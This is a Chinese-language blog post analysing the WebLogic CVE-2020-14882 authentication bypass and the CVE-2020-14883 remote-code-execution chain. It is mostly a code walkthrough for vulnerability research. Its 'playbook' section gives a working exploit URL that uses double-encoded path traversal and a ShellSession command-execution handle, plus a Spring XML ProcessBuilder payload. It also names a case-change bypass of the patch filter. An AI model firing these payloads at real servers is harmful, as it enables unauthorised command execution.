<html>
  <head>
    <meta charset="utf-8" />
<meta name="referrer" content="no-referrer">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CVE-2020-14882&amp;CVE-2020-14883分析 | xray 技术博客</title>
<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790414551">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="CVE-2020-14882&amp;CVE-2020-14883分析 | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-176727836-2');
</script>


    <meta name="description" content="0x01 HTTP绕过部分
开局先说一句四毛二永远滴神。
weblogic 会在weblogic.servlet.internal.WebAppServletContext进行权限检查，主要是调用 WebAppSecurity#checkA..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://blog.xray.cool">
  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790414551" alt="">
  </a>
  <h1 class="site-title">
    xray 技术博客
  </h1>
  <p class="site-description">
    
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          首页
        </a>
      
    
      
        <a href="/archives/" class="menu">
          归档
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              CVE-2020-14882&amp;CVE-2020-14883分析
            </h2>
            <div class="post-info">
              <span>
                2020-11-19
              </span>
              <span>
                9 min read
              </span>
              
            </div>
            
              <img class="post-feature-image" src="https://blog.xray.cool/post-images/cve-2020-14882&amp;&amp;cve-2020-14883.png" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content">
                <h2 id="0x01-http绕过部分">0x01 HTTP绕过部分</h2>
<p>开局先说一句<strong>四毛二</strong>永远滴神。</p>
<p><strong>weblogic</strong> 会在<code>weblogic.servlet.internal.WebAppServletContext</code>进行权限检查，主要是调用 <strong>WebAppSecurity#checkAccess</strong> 方法。</p>
<figure data-type="image" tabindex="1"><img src="https://blog.xray.cool/post-images/1609837513252.png" alt="" loading="lazy"></figure>
<p>在 <strong>WebAppSecurity#checkAccess</strong> 方法当中会根据当前的URL进行资源判断。</p>
<figure data-type="image" tabindex="2"><img src="https://blog.xray.cool/post-images/1609837526925.png" alt="" loading="lazy"></figure>
<p>我们可以看看 <strong>WebAppSecurityWLS#getConstraint</strong> 方法，这里会进入到 <strong>StandardURLMapping#getExactOrPathMatch</strong> 方法当中。</p>
<figure data-type="image" tabindex="3"><img src="https://blog.xray.cool/post-images/1609837539921.png" alt="" loading="lazy"></figure>
<p>而实际上 <strong>this.matchMap</strong> 的内容与我们 <strong>web.xml</strong> 文件当中的，静态配置项是一致的，为了解决这个静态目录的问题，<strong>weblogic</strong> 还自动补齐了一个<code>/</code>。</p>
<figure data-type="image" tabindex="4"><img src="https://blog.xray.cool/post-images/1609837553543.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://blog.xray.cool/post-images/1609837565489.png" alt="" loading="lazy"></figure>
<p>在 <strong>WebAppSecurityWLS#getConstraint</strong> 方法处理之后返回的是 <strong>ResourceConstraint</strong> 且对应的文件id正是我们的静态路径<code>/images/*</code>，在这里已经把我们的 <strong>unrestrict</strong> 属性设置为 <strong>true</strong> ，且 <strong>loginRequired</strong> 属性为 <strong>fasle</strong> 。</p>
<figure data-type="image" tabindex="6"><img src="https://blog.xray.cool/post-images/1609837578670.png" alt="" loading="lazy"></figure>
<p>之后会调用 <strong>SecurityModule#isAuthorized</strong> 方法进行检查。</p>
<figure data-type="image" tabindex="7"><img src="https://blog.xray.cool/post-images/1609837591906.png" alt="" loading="lazy"></figure>
<p>而 <strong>SecurityModule#isAuthorized</strong> 方法当中先获取用户当前 <strong>session</strong> ，在调用 <strong>SecurityModule#checkAccess</strong> 进行检查。</p>
<figure data-type="image" tabindex="8"><img src="https://blog.xray.cool/post-images/1609837604871.png" alt="" loading="lazy"></figure>
<p>在 <strong>SecurityModule#checkAccess</strong> 也是调用 <strong>CertSecurityModule#checkUserPerm</strong> 进行检查。</p>
<pre><code>    boolean checkAccess(HttpServletRequest req, HttpServletResponse rsp, SessionSecurityData session, ResourceConstraint cons, boolean applySAF) throws IOException, ServletException {
    
    ...

                if (this.modules.length - 1 == i) {
                    if (lastModule instanceof FormSecurityModule) {
                        return lastModule.checkAccess(req, rsp, session, cons, applySAF);
                    }

                    return lastModule.checkUserPerm(req, rsp, session, cons, subject, applySAF);
                }
</code></pre>
<p>在 <strong>CertSecurityModule#checkUserPerm</strong> 进行检查的过程中，又回到了 <strong>WLSSecurity#hasPermission</strong> 方法当中。</p>
<figure data-type="image" tabindex="9"><img src="https://blog.xray.cool/post-images/1609837618225.png" alt="" loading="lazy"></figure>
<p>在 <strong>WebAppSecurity.class#hasPermission</strong> 方法，也是通过判断当前对象的 <strong>unrestrict</strong> 属性，也就是说判断他是不是静态资源，前面我们说过这里的属性自然是 <strong>true</strong> 。</p>
<figure data-type="image" tabindex="10"><img src="https://blog.xray.cool/post-images/1609837628641.png" alt="" loading="lazy"></figure>
<h2 id="0x02-rce部分">0x02 Rce部分</h2>
<p>实际上在 <strong>WebAppServletContext#doSecuredExecute</strong> 方法当中调用了 <strong>checkAccess</strong> 方法针对路径是否有权限进行了判断，判断过程就是 <strong>0x01</strong> 部分中，之后会调用相应 <strong>subject</strong> 对象的 <strong>run</strong> 方法分别进入进行处理。</p>
<figure data-type="image" tabindex="11"><img src="https://blog.xray.cool/post-images/1609837642150.png" alt="" loading="lazy"></figure>
<p><strong>weblogic</strong> 的 <strong>console</strong> 相关路由映射在<code>\Middleware\Oracle_Home\wlserver\server\lib\consoleapp\webapp\WEB-INF\web.xml</code>当中，实际上相关映射关系是 <strong>AppManagerServlet</strong> 这个servlet name，我们登陆后访问后台的url是 <strong>console.portal</strong> ，因此可以跟进来看看。</p>
<pre><code>  &lt;!-- NetUIx Servlet --&gt;
  &lt;servlet&gt;
    &lt;servlet-name&gt;AppManagerServlet&lt;/servlet-name&gt;
    &lt;servlet-class&gt;weblogic.servlet.AsyncInitServlet&lt;/servlet-class&gt;
    
    &lt;init-param&gt;
      &lt;param-name&gt;weblogic.servlet.AsyncInitServlet.servlet-class-name&lt;/param-name&gt;
      &lt;param-value&gt;com.bea.console.utils.MBeanUtilsInitSingleFileServlet&lt;/param-value&gt;
    &lt;/init-param&gt;
    
    &lt;init-param&gt;
        &lt;param-name&gt;wl-dispatch-policy&lt;/param-name&gt;
        &lt;param-value&gt;consoleWorkManager&lt;/param-value&gt;
    &lt;/init-param&gt;

    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    
  &lt;/servlet&gt;
&lt;!-- NetUIx Servlet Mapping --&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;AppManagerServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;/appmanager/*&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;AppManagerServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;*.portlet&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;AppManagerServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;*.portion&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
  &lt;servlet-mapping&gt;
    &lt;servlet-name&gt;AppManagerServlet&lt;/servlet-name&gt;
    &lt;url-pattern&gt;*.portal&lt;/url-pattern&gt;
  &lt;/servlet-mapping&gt;
</code></pre>
<p>选择在<code>weblogic.servlet.AsyncInitServlet</code>的 <strong>service</strong> 位置下个断点，为什么在这里下断点，原因就是上面那个 <strong>web.xml</strong> 文件的映射关系。</p>
<figure data-type="image" tabindex="12"><img src="https://blog.xray.cool/post-images/1609837657331.png" alt="" loading="lazy"></figure>
<p>在 <strong>MBeanUtilsInitSingleFileServlet#service</strong> 方法当中不允许出现<code>;</code>符号，之后调用他的父类 <strong>servlet</strong> 的 <strong>service</strong> 方法，也就是 <strong>SingleFileServlet#service</strong></p>
<pre><code>    public void service(ServletRequest req, ServletResponse resp) throws ServletException, IOException {
        if (!hasInited) {...}

        if (req instanceof HttpServletRequest) {
            HttpServletRequest httpServletRequest = (HttpServletRequest)req;
            String url = httpServletRequest.getRequestURI();
            if (url.indexOf(&quot;;&quot;) &gt; 0) {
                if (resp instanceof HttpServletResponse) {
                    HttpServletResponse httpServletResponse = (HttpServletResponse)resp;
                    httpServletResponse.sendError(404);
                }

                return;
            }
        }

        try {
            super.service(req, resp);
</code></pre>
<p>而在 <strong>SingleFileServlet#service</strong> 经过一系列处理之后，也是会调用他的父类 <strong>servlet</strong> 的 <strong>service</strong> 方法，也就是 <strong>UIServlet#service</strong> 方法，在 <strong>UIServlet#service</strong> 方法当中会根据http头部不同，选择相对应的方法。</p>
<figure data-type="image" tabindex="13"><img src="https://blog.xray.cool/post-images/1609837669674.png" alt="" loading="lazy"></figure>
<pre><code>    public void service(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String method = request.getMethod();
        if (method.equals(&quot;GET&quot;)) {
            this.doGet(request, response);
        } else if (method.equals(&quot;POST&quot;)) {
            this.doPost(request, response);
        } else if (method.equals(&quot;HEAD&quot;)) {
            super.doHead(request, response);
        } else {
            this.doPost(request, response);
        }
</code></pre>
<p>经过上面的处理最后会来到<code>com.bea.netuix.servlets.manager.UIServlet</code>，跟进 <strong>createUIContext</strong></p>
<figure data-type="image" tabindex="14"><img src="https://blog.xray.cool/post-images/1609837681517.png" alt="" loading="lazy"></figure>
<p>在 <strong>com.bea.netuix.servlets.manager.UIServletInternal#createUIContext</strong> 会调用 <strong>getTree</strong> 方法进行处理。</p>
<figure data-type="image" tabindex="15"><img src="https://blog.xray.cool/post-images/1609837691066.png" alt="" loading="lazy"></figure>
<p>在 <strong>com.bea.netuix.servlets.manager.UIServletInternal#getTree</strong> 方法当中会进行一次 <strong>URL</strong> 解码 ，这⾥可以看出来为什么可以⽤url 2次编码可以绕过。之后的处理过程中会有if判断，判断是不是<code>__Streaming.portal</code>，如果不是，会转发到<code>processStream(requestPattern, ctxt, requestPattern, request, response, setContentType);</code>这个构造方法进行处理。</p>
<figure data-type="image" tabindex="16"><img src="https://blog.xray.cool/post-images/1609837700558.png" alt="" loading="lazy"></figure>
<p>在 <strong>processStream</strong> 这个构造方法中，会把传入数据转发到 <strong>SingleFileProcessor#getMergedControlFromFile</strong> 当中进行处理</p>
<figure data-type="image" tabindex="17"><img src="https://blog.xray.cool/post-images/1609837710985.png" alt="" loading="lazy"></figure>
<p>而在 <strong>SingleFileProcessor#getMergedControlFromFile</strong> 当中，创建了一个 <strong>saxParser</strong> 的xml解析器，并且调用 <strong>getControlFactoryFromFile</strong> 方法进行处理。</p>
<figure data-type="image" tabindex="18"><img src="https://blog.xray.cool/post-images/1609837719828.png" alt="" loading="lazy"></figure>
<p>在 <strong>SingleFileProcessor#getControlFactoryFromFile</strong> ，可以看到下面这句代码。</p>
<pre><code>            ControlTreeFactory ctf = this.getControlFactoryFromFileWithoutCaching(filename, saxParser);
</code></pre>
<p>首先先从<code>this.servletContext.getResourceAsStream(filename);</code>方法内获取数据，最后会跟到 <strong>War#getSourceFromDisk</strong> 的ceche中加载了我们当前的 <strong>console.portal</strong> 。</p>
<figure data-type="image" tabindex="19"><img src="https://blog.xray.cool/post-images/1609837731179.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="20"><img src="https://blog.xray.cool/post-images/1609837739201.png" alt="" loading="lazy"></figure>
<p>然后在 <strong>WebAppServletContext#getResourceAsStream</strong> 方法当中会根据我们刚刚的路径<code>D:\newweblogic\wlserver\server\lib\consoleapp\webapp\console.portal</code>获取 <strong>getInputStream</strong> 。</p>
<p>之后就是在 <strong>SingleFileProcessor#getControlFactoryFromFile</strong> ，我们从<code>D:\newweblogic\wlserver\server\lib\consoleapp\webapp\console.portal</code>读取的xml内容，交给 <strong>getNetuixControlFactory</strong> 方法去做xml内容的解析。</p>
<figure data-type="image" tabindex="21"><img src="https://blog.xray.cool/post-images/1609837755939.png" alt="" loading="lazy"></figure>
<p>完成<code>this.createUIContext(request, response, (UIControl)null);</code>之后，把相关对象内容付值给 <strong>jspContext</strong> 的 <strong>tree</strong> 属性，并且调用 <strong>this.runLifecycle</strong> 继续完成下面操作。</p>
<figure data-type="image" tabindex="22"><img src="https://blog.xray.cool/post-images/1609837765261.png" alt="" loading="lazy"></figure>
<p>在 <strong>runLifecycle</strong> 方法当中，赋值给 <strong>jspContext</strong> 的 <strong>lifecycle</strong> 属性继续完成下面操作。</p>
<figure data-type="image" tabindex="23"><img src="https://blog.xray.cool/post-images/1609837773687.png" alt="" loading="lazy"></figure>
<p>跟进 <strong>lifecycle.run</strong> 方法，就是下面这些操作，先看看 <strong>runInbound</strong> 方法。 <strong>runInbound</strong> 方法，把 <strong>controlTreeRoot</strong> 对象取出来赋值给root对象，接着把<code>this._inboundLifecycle</code>丢给 <strong>types</strong> 数组。之后调用 <strong>processLifecycles</strong> 方法进行解析。</p>
<pre><code>    public void run(UIContext context, IControlTreeWalkerPool walkerPool) throws ServletException, IOException {
        if (!context.isOutbound() &amp;&amp; context.isPostback()) {
            this.runInbound(context);
            context.setOutbound();
            this.runOutbound(context, walkerPool);
            this.runCleanup(context);
        } 
</code></pre>
<figure data-type="image" tabindex="24"><img src="https://blog.xray.cool/post-images/1609837784909.png" alt="" loading="lazy"></figure>
<p>在 <strong>processLifecycles</strong> 方法当中会调用<code>com.bea.netuix.nf.ControlTreeWalker.walk</code>方法进行循环解析，我们上面的 <strong>types</strong> 数组。</p>
<figure data-type="image" tabindex="25"><img src="https://blog.xray.cool/post-images/1609837793762.png" alt="" loading="lazy"></figure>
<p>在 <strong>walk</strong> 方法当中会调用 <strong>walkRecursive</strong> 方法进行处理。</p>
<figure data-type="image" tabindex="26"><img src="https://blog.xray.cool/post-images/1609837802944.png" alt="" loading="lazy"></figure>
<p>在 <strong>walkRecursive</strong> 方法当中，通过<code>root.getVisitorForLifecycle(vt);</code>获取到当前的 <strong>ControlVisitor</strong> 对象，在判断其是否是Root节点，如果是Root节点，就会进入相应对象重写的 <strong>visitRoot</strong> 方法进行处理。</p>
<figure data-type="image" tabindex="27"><img src="https://blog.xray.cool/post-images/1609837812484.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="28"><img src="https://blog.xray.cool/post-images/1609837820615.png" alt="" loading="lazy"></figure>
<p>之后就是在 <strong>walk</strong> 方法递归循环<code>ControlTree</code>的过程，可以看到与xml⽂件的节点对应。</p>
<figure data-type="image" tabindex="29"><img src="https://blog.xray.cool/post-images/1609837829248.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="30"><img src="https://blog.xray.cool/post-images/1609837837554.png" alt="" loading="lazy"></figure>
<p>根据补丁这次出问题的类是在<code>com.bea.netuix.servlets.controls.portlet.Portlet</code>，而我们前面<code>ControlTree</code>中的<code>Control</code>对应包在<code>com.bea.netuix.servlets.controls</code>。</p>
<pre><code>    protected void init() {
        boolean isServiceLevelEnabled = this.checkServiceLevel();
        if (!isServiceLevelEnabled) {
            this.setSuspended(true);
        }

        super.init();
</code></pre>
<p>一直跟进 <strong>init</strong> 方法会来到 <strong>BreadcrumbBacking#init</strong> 当中，首先 <strong>findFirstHandle</strong> 方法循环获取 <strong>getParameterNames</strong> 并且判断是不是handle，如果是的话，把 <strong>param</strong> 部分取出赋值给 <strong>handleStr</strong> 。</p>
<figure data-type="image" tabindex="31"><img src="https://blog.xray.cool/post-images/1609837848740.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="32"><img src="https://blog.xray.cool/post-images/1609837859032.png" alt="" loading="lazy"></figure>
<p>之后就来到核心方法 <strong>getHandle</strong> 当中。此时的参数我们可控。这⾥有⼀个任意类实际例化的操作，并且可以传⼊⾃定义参数，参数会⾃动从 <code>serializedObjectID</code> 的括号中提取。</p>
<figure data-type="image" tabindex="33"><img src="https://blog.xray.cool/post-images/1609837872815.png" alt="" loading="lazy"></figure>
<h2 id="0x03-玩法">0x03 玩法</h2>
<pre><code>http://192.168.2.106:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22);

com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext

xml文件内容
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
  &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;
    &lt;constructor-arg&gt;
      &lt;list&gt;
        &lt;value&gt;cmd&lt;/value&gt;
        &lt;value&gt;/c&lt;/value&gt;
        &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt;
      &lt;/list&gt;
    &lt;/constructor-arg&gt;
  &lt;/bean&gt;
&lt;/beans&gt;
</code></pre>
<h2 id="0x04-补丁">0x04 补丁</h2>
<p><code>com.bea.console.utils.MBeanUtilsInitSingleFileServlet</code>过滤了关键字<code>;、%252e%252e、%2e%2e、..、%3c、%3e、&lt;、&gt;</code>，可以通过大小写绕过</p>
<figure data-type="image" tabindex="34"><img src="https://blog.xray.cool/post-images/1609837882727.png" alt="" loading="lazy"></figure>
<p><code>com.bea.console.handles.HandleFactory</code>只能实例化<code>com.bea.console.handles.Handle</code>的子类。</p>
<figure data-type="image" tabindex="35"><img src="https://blog.xray.cool/post-images/1609837889904.png" alt="" loading="lazy"></figure>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li>
<ul>
<li><a href="#0x01-http%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86">0x01 HTTP绕过部分</a></li>
<li><a href="#0x02-rce%E9%83%A8%E5%88%86">0x02 Rce部分</a></li>
<li><a href="#0x03-%E7%8E%A9%E6%B3%95">0x03 玩法</a></li>
<li><a href="#0x04-%E8%A1%A5%E4%B8%81">0x04 补丁</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">下一篇</div>
            <a href="https://blog.xray.cool/post/HTTPS-hijacking/">
              <h3 class="post-title">
                HTTPS劫持漫谈：代理劫持与透明劫持
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  
  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
